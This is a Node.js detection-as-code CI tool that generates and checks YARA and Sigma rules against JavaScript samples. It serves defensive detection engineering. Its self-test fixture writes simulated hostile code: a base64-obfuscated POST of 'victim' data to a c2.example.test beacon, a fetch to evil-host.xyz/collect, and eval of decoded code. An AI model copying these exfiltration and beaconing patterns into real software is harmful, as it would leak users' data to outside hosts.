#!/usr/bin/env node
/**
 * Detection-as-code CI — scan a repository of JavaScript samples, generate and
 * validate YARA + Sigma rules, and fail the build when a malicious sample has no
 * matching detection.
 *
 *   node app.mjs --path samples/repo --generate
 *   node app.mjs --path samples/repo --fail-on suspicious --json
 *   node app.mjs --self-test
 */

import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { scanRepo } from './lib/scan.js'
import { buildDetectionUnit, matchSigma, matchYara, parseSigma, parseYara, renderSigma, renderYara } from './lib/rules.js'
import { evaluateCoverage, isRequired } from './lib/coverage.js'
import { loadDetections, writeDetection } from './lib/store.js'

const args = process.argv.slice(2)
const flag = (name) => args.includes(name)
const value = (name, fallback) => {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

function printHelp() {
  console.log(`Detection-as-code CI
  --path <dir>             repository of JavaScript samples (required)
  --detections <dir>       detection repository (default: <path>/detections)
  --generate               generate YARA+Sigma rules for uncovered samples
  --fail-on <level>        malicious (default) or suspicious
  --min-score <n>          verdict score treated as required (default 60)
  --json                   machine-readable gate report
  --self-test              run the built-in validation
  --help                   this help`)
}

/**
 * Run the full detection-as-code gate.
 *
 * @param {{root: string, detectionsDir?: string, generate?: boolean, failOn?: 'malicious'|'suspicious', minScore?: number}} options
 */
export async function runGate(options) {
  const detectionsDir = options.detectionsDir ?? join(options.root, 'detections')
  const settings = { failOn: options.failOn ?? 'malicious', minScore: options.minScore }
  const scan = await scanRepo(options.root, settings)
  const initial = await loadDetections(detectionsDir)
  const generated = []
  const warnings = []

  if (options.generate) {
    const preview = evaluateCoverage({ samples: scan.samples, detections: initial.detections, errors: initial.errors, ...settings })
    const uncovered = new Set(preview.coverage.uncovered)
    for (const sample of scan.samples) {
      if (!isRequired(sample, settings) || !uncovered.has(sample.relative)) continue
      const unit = buildDetectionUnit(sample)
      if (unit.strings.length === 0 && unit.selections.length === 0) {
        warnings.push(`${sample.relative}: no stable indicators to build a detection from`)
        continue
      }
      const result = await writeDetection(detectionsDir, unit)
      generated.push(...result.written)
    }
  }

  const loaded = options.generate ? await loadDetections(detectionsDir) : initial
  const evaluation = evaluateCoverage({
    samples: scan.samples,
    detections: loaded.detections,
    errors: loaded.errors,
    ...settings,
  })
  return {
    root: options.root,
    detectionsDir,
    scanned: scan.scanned,
    samples: evaluation.rows,
    coverage: evaluation.coverage,
    falsePositives: evaluation.falsePositives,
    stale: evaluation.stale,
    errors: evaluation.errors,
    gate: evaluation.gate,
    generated,
    warnings,
    detections: loaded.detections.map((detection) => ({ id: detection.id, file: detection.file, kind: detection.kind })),
    settings: { failOn: settings.failOn, minScore: settings.minScore ?? 60 },
  }
}

/** Render the gate report as a CI-friendly text block. */
export function renderGateText(report) {
  const lines = []
  lines.push(`scan     : ${report.scanned} sample(s) under ${report.root}`)
  lines.push(`settings : fail-on=${report.settings.failOn} min-score=${report.settings.minScore}`)
  for (const row of report.samples) {
    const rules = row.matchedBy.map((entry) => entry.id).join(', ') || '—'
    lines.push(`  ${row.verdict.padEnd(10)} ${String(row.score).padStart(3)}  ${row.relative.padEnd(32)} ${row.required ? 'required' : 'context '} ${rules}`)
  }
  lines.push(`rules    : ${report.detections.length} loaded, ${report.stale.length} stale, ${report.errors.length} invalid`)
  lines.push(`coverage : ${report.coverage.covered}/${report.coverage.required} (${(report.coverage.ratio * 100).toFixed(1)}%)`)
  for (const file of report.generated) lines.push(`generated: ${file}`)
  for (const warning of report.warnings) lines.push(`warning  : ${warning}`)
  for (const entry of report.errors) lines.push(`invalid  : ${entry.file} — ${entry.message}`)
  for (const file of report.stale) lines.push(`stale    : ${file}`)
  lines.push(`gate     : ${report.gate.ok ? 'PASS' : 'FAIL'}`)
  for (const reason of report.gate.reasons) lines.push(`reason   : ${reason}`)
  return lines.join('\n')
}

function assert(condition, message) {
  if (!condition) throw new Error(`self-test: ${message}`)
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'detection-as-code-'))
  try {
    const repo = join(directory, 'repo')
    const detectionsDir = join(directory, 'detections')
    const maliciousPath = join(repo, 'src', 'malicious.js')
    const benignPath = join(repo, 'src', 'benign.js')
    await mkdir(join(repo, 'src'), { recursive: true })
    await writeFile(
      maliciousPath,
      [
        'var cfg = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u");',
        'fetch(cfg, { method: "POST", body: btoa("victim") }).catch(function(){});',
        'fetch("https://evil-host.xyz/collect").catch(function(){});',
        'eval(atob("Y29uc29sZS5sb2coMSk="));',
        'localStorage.setItem("stage", "2");',
        'document.write("<div>ok</div>");',
        'Function("return 1")();',
      ].join('\n'),
      'utf8',
    )
    await writeFile(benignPath, 'export const sum = (a, b) => a + b;\n', 'utf8')

    // 1) No detections yet: the gate must fail on missing coverage.
    const before = await runGate({ root: repo, detectionsDir })
    assert(before.scanned === 2, `expected 2 scanned samples, got ${before.scanned}`)
    assert(before.coverage.required === 1, `expected 1 required sample, got ${before.coverage.required}`)
    assert(before.coverage.uncovered.includes('src/malicious.js'), 'missing sample was not reported as uncovered')
    assert(!before.gate.ok && before.gate.exitCode === 2, 'gate did not fail without detections')
    assert(before.generated.length === 0, 'rules were generated without --generate')

    // 2) Generate: one unit renders both a YARA and a Sigma artefact.
    const after = await runGate({ root: repo, detectionsDir, generate: true })
    assert(after.generated.length === 2, `expected 2 generated files, got ${after.generated.length}`)
    assert(after.coverage.covered === 1 && after.coverage.ratio === 1, 'coverage was not restored after generation')
    assert(after.gate.ok && after.gate.exitCode === 0, `gate still failing: ${after.gate.reasons.join('; ')}`)
    assert(after.falsePositives.length === 0, 'generated rules match the benign sample')

    // 3) Idempotency: re-running generation must not rewrite existing rules.
    const again = await runGate({ root: repo, detectionsDir, generate: true })
    assert(again.generated.length === 0, 'generation was not idempotent')
    assert(again.gate.ok, 'idempotent run failed the gate')

    // 4) Round trip: the YARA and Sigma files parse back and discriminate.
    const scan = await scanRepo(repo)
    const malicious = scan.samples.find((sample) => sample.relative === 'src/malicious.js')
    const benign = scan.samples.find((sample) => sample.relative === 'src/benign.js')
    assert(malicious && benign, 'scanner did not return both samples')
    const loaded = await loadDetections(detectionsDir)
    assert(loaded.errors.length === 0, `generated rules failed to parse: ${JSON.stringify(loaded.errors)}`)
    assert(loaded.detections.length === 2, `expected 2 rules, got ${loaded.detections.length}`)
    const yara = loaded.detections.find((detection) => detection.kind === 'yara')
    const sigma = loaded.detections.find((detection) => detection.kind === 'sigma')
    const yaraText = await readFile(yara.file, 'utf8')
    for (const needle of ['rule JS_', 'strings:', 'condition:', 'meta:']) {
      assert(yaraText.includes(needle), `YARA file is missing ${needle}`)
    }
    const yaraRule = parseYara(yaraText)
    assert(yaraRule.strings.length >= 1, 'YARA rule declares no strings')
    assert(matchYara(yaraRule, malicious.haystack), 'YARA rule does not match the malicious sample')
    assert(!matchYara(yaraRule, benign.haystack), 'YARA rule matches the benign sample')
    const sigmaText = await readFile(sigma.file, 'utf8')
    const sigmaRule = parseSigma(sigmaText)
    assert(matchSigma(sigmaRule, malicious.record), 'Sigma rule does not match the malicious sample')
    assert(!matchSigma(sigmaRule, benign.record), 'Sigma rule matches the benign sample')

    // 5) Renderer output is stable for the same unit.
    const unit = buildDetectionUnit(malicious)
    assert(renderYara(unit) === renderYara(unit), 'YARA rendering is not deterministic')
    assert(renderSigma(unit) === renderSigma(unit), 'Sigma rendering is not deterministic')

    // 6) Invalid rules are collected as errors and fail the gate.
    await writeFile(join(directory, 'broken.yar'), 'rule BROKEN {\n  strings:\n    $a = "abc" ascii\n}\n', 'utf8')
    await writeFile(
      join(directory, 'unsupported.yar'),
      'rule UNSUPPORTED {\n  strings:\n    $a = "abc" ascii\n  condition:\n    filesize < 10\n}\n',
      'utf8',
    )
    const broken = await loadDetections(directory)
    assert(broken.errors.length === 2, `expected 2 invalid rules, got ${broken.errors.length}`)
    assert(broken.errors.some((error) => /condition/.test(error.message)), 'missing condition was not reported')
    assert(broken.errors.some((error) => /unsupported/.test(error.message)), 'unsupported condition was not reported')

    // 7) Stale rules are warnings, not failures.
    const staleDir = join(directory, 'stale')
    await mkdir(staleDir, { recursive: true })
    await writeFile(
      join(staleDir, 'stale.yar'),
      'rule STALE {\n  meta:\n    author = "test"\n  strings:\n    $a = "zzz-no-such-indicator" ascii\n  condition:\n    any of them\n}\n',
      'utf8',
    )
    const staleReport = await runGate({ root: repo, detectionsDir: staleDir })
    assert(staleReport.stale.length === 1, `expected 1 stale rule, got ${staleReport.stale.length}`)
    assert(!staleReport.gate.ok, 'uncovered sample should still fail the stale run')
    assert(staleReport.gate.reasons.every((reason) => !reason.includes('stale')), 'stale rule failed the gate')

    // 8) Determinism: identical inputs produce identical gate reports.
    const first = await runGate({ root: repo, detectionsDir })
    const second = await runGate({ root: repo, detectionsDir })
    assert(JSON.stringify(first) === JSON.stringify(second), 'gate report is not deterministic')

    // 9) Suspicious mode widens the requirement set without changing the scan.
    const suspicious = await runGate({ root: repo, detectionsDir, failOn: 'suspicious', minScore: 100 })
    assert(suspicious.settings.failOn === 'suspicious', 'fail-on setting was not recorded')
    assert(suspicious.coverage.required >= first.coverage.required, 'suspicious mode shrank the requirement set')

    console.log(
      `gate: scanned=${after.scanned} rules=${after.detections.length} coverage=${after.coverage.covered}/${after.coverage.required} ` +
        `generated=${after.generated.length} exit=${after.gate.exitCode}`,
    )
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

async function main() {
  if (flag('--help')) return printHelp()
  if (flag('--self-test')) return selfTest()
  const root = value('--path')
  if (!root) {
    printHelp()
    process.exitCode = 2
    return
  }
  const report = await runGate({
    root,
    detectionsDir: value('--detections'),
    generate: flag('--generate'),
    failOn: value('--fail-on', 'malicious'),
    minScore: value('--min-score') ? Number(value('--min-score')) : undefined,
  })
  if (flag('--json')) console.log(JSON.stringify(report, null, 2))
  else console.log(renderGateText(report))
  process.exitCode = report.gate.exitCode
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
